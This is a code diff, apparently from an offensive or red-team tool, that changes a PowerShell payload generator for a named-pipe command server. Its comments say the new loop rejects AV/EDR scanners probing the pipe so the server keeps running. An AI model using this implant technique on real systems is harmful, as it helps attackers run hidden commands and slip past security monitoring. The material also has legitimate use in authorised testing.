@@ -184,21 +184,28 @@ function New-PayloadScript {
             "`$$vPipe.Close();`$$vPipe.Dispose()"
         )
     } else {
-        # pipeSetup creates the pipe, reader, writer, then loops WaitForConnection with a
-        # 2-second read timeout to reject phantom connections (AV/EDR scanning newly created
-        # named pipes). After a real client sends the first command, $vCmd is populated and
-        # the validation loop exits. $vCb flags that the first command is already in $vCmd
-        # so the main loop skips the initial ReadLine().
+        # pipeSetup creates PipeSecurity once, then loops: create a fresh NamedPipeServerStream
+        # each iteration, call WaitForConnection, then use ReadLineAsync with a 2-second timeout
+        # to reject phantom connections (AV/EDR scanners that silently connect to newly-created
+        # named pipes). A fresh pipe per iteration avoids the PipeState.Disconnected trap: when
+        # a phantom disconnects cleanly, .NET auto-sets PipeState=Disconnected, which causes
+        # Disconnect() to throw InvalidOperationException — crashing the server. By recreating
+        # the pipe via Dispose(), we sidestep the state machine entirely. Real clients send the
+        # first command immediately on connect, pass the timeout, and break the loop. $vCb flags
+        # that $vCmd is already populated so the main loop skips the initial ReadLine().
         $pipeSetup = (
             "`$$vSec=New-Object System.IO.Pipes.PipeSecurity;" +
             "`$$vSid=New-Object System.Security.Principal.SecurityIdentifier '$SID';" +
             "`$$vAr=New-Object System.IO.Pipes.PipeAccessRule(`$$vSid,'FullControl','Allow');" +
             "`$$vSec.AddAccessRule(`$$vAr);" +
             "`$$vT=$serverType;" +
+            "while(`$true){" +
             "`$$vPipe=New-Object -TypeName `$$vT -ArgumentList '$PipeName','InOut',1,'Byte','None',$bufSize,$bufSize,`$$vSec;" +
             "`$$vRd=New-Object IO.StreamReader(`$$vPipe);" +
             "`$$vWr=New-Object IO.StreamWriter(`$$vPipe);" +
-            "while(`$true){`$$vPipe.WaitForConnection();try{`$$vTm=`$$vRd.ReadLineAsync();if(`$$vTm.Wait(2000)-and`$null-ne`$$vTm.Result){`$$vCmd=`$$vTm.Result;break}}catch{};`$$vPipe.Disconnect()}"
+            "`$$vPipe.WaitForConnection();" +
+            "try{`$$vTm=`$$vRd.ReadLineAsync();if(`$$vTm.Wait(2000)-and`$null-ne`$$vTm.Result){`$$vCmd=`$$vTm.Result;break}}catch{};" +
+            "`$$vPipe.Dispose()}"
         )
         $loop = (
             "`$$vCb=`$true;" +
